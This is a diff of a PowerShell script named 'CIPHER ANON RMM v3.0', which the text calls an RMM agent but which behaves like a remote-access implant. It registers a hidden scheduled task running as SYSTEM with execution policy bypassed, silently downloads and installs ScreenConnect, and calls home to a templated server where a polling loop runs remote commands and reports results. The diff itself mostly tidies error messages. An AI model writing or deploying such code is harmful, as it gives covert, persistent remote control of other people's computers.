@@ -1,5 +1,5 @@
 # ============================================================
-# CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY (WORKING)
+# CIPHER ANON RMM v3.0 — CLEAN FIXED VERSION
 # ============================================================
 
 $BASE_URL = "{{BASE_URL}}"
@@ -24,7 +24,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY"
+Write-Log "CIPHER ANON RMM v3.0"
 Write-Log "Target: $env:COMPUTERNAME"
 Write-Log "============================================"
 
@@ -41,13 +41,11 @@ function Get-RmmClientId {
 function Install-Persistence {
     $taskName = "CipherAnonRMM"
     $scriptPath = $MyInvocation.MyCommand.Path
-
     $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
     if ($task) {
         Write-Log "Scheduled task already exists"
         return
     }
-
     Write-Log "Creating scheduled task: $taskName"
     try {
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
@@ -56,21 +54,18 @@ function Install-Persistence {
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
         Write-Log "Scheduled task created"
     } catch {
-        $err = $_.Exception.Message
-        Write-Log "Failed to create scheduled task: $err"
+        Write-Log "Failed to create scheduled task: $_"
     }
 }
 
 function Execute-Command {
     param($Command)
-
     Write-Log "Executing: $Command"
-
     $result = ""
     $success = $true
 
     if ($Command -like "install-screenconnect*") {
-        Write-Log "Downloading ScreenConnect from $SCREENCONNECT_URL..."
+        Write-Log "Downloading ScreenConnect..."
         $installer = "$env:TEMP\sc_installer.msi"
         try {
             $webClient = New-Object System.Net.WebClient
@@ -85,14 +80,6 @@ function Execute-Command {
             Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
             Remove-Item $installer -Force -ErrorAction SilentlyContinue
             $result = "ScreenConnect installed successfully"
-
-            try {
-                $scKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ServerUrl" -ErrorAction SilentlyContinue
-                if ($scKey) {
-                    $result = $result + " | Server URL: $($scKey.ServerUrl)"
-                }
-            } catch {}
-
             try {
                 $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                 if ($scId) {
@@ -112,8 +99,7 @@ function Execute-Command {
             Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
             $result = "RMM uninstalled successfully"
         } catch {
-            $err = $_.Exception.Message
-            $result = "Failed to uninstall: $err"
+            $result = "Failed to uninstall: $_"
             $success = $false
         }
         return @{ success = $success; result = $result }
@@ -151,8 +137,7 @@ function Execute-Command {
         $result = $output
         $success = $true
     } catch {
-        $err = $_.Exception.Message
-        $result = "Unknown command or error: $err"
+        $result = "Unknown command or error: $_"
         $success = $false
     }
 
@@ -188,12 +173,10 @@ try {
     $resp.Close()
     Write-Log "Registered with server"
 } catch {
-    $err = $_.Exception.Message
-    Write-Log "Registration failed: $err"
+    Write-Log "Registration failed: $_"
 }
 
 Write-Log "Starting RMM background loop..."
-
 $scriptBlock = {
     $BASE_URL = "{{BASE_URL}}"
     $RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
@@ -224,7 +207,6 @@ $scriptBlock = {
 
     function Execute-Command {
         param($Command)
-
         $result = ""
         $success = $true
 
@@ -261,8 +243,7 @@ $scriptBlock = {
                 Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
                 $result = "Uninstalled"
             } catch {
-                $err = $_.Exception.Message
-                $result = "Failed: $err"
+                $result = "Failed: $_"
                 $success = $false
             }
             return @{ success = $success; result = $result }
@@ -300,8 +281,7 @@ $scriptBlock = {
             $result = $output
             $success = $true
         } catch {
-            $err = $_.Exception.Message
-            $result = "Error: $err"
+            $result = "Error: $_"
             $success = $false
         }
 
@@ -371,8 +351,7 @@ $scriptBlock = {
                 }
             }
         } catch {
-            $err = $_.Exception.Message
-            Write-Log "Loop error: $err"
+            Write-Log "Loop error: $_"
         }
         Start-Sleep -Milliseconds $POLL_INTERVAL
     }
